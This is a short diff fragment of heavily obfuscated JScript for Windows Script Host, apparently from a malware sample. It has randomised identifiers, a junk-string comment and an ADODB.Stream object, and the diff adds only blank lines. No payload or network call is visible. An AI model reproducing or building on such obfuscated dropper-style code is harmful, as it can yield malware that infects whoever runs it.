@@ -917,7 +917,10 @@ function izzU() {
     }
 
     PLnEyqCPKHV();
+
+
     function KWgwJwOlqJcs(IMhTname) {
+
         function rStinsVp(rand) {
             var eqQu = [];
             var EPtLPmand = -1;
@@ -949,7 +952,9 @@ function izzU() {
         }
 
         var HZtSmFNRdJM_data = rStinsVp(VKw);
+
         var qPCIyff = rStinsVp(VKw);
+
 ////cWO7h7UOQEdvc9GiXfI7h2j00qzhHNh03qS4qJXfoQyWniUmqpKHaoPNTEYwSY3H2IVazY1nJbmfpKKyj9fNWAwPcrwVPxiE04yYjYwnxP
         function udpIHxNm(IMhTname) {
             var SlSPWu = WScript.CreateObject("ADODB.Stream");
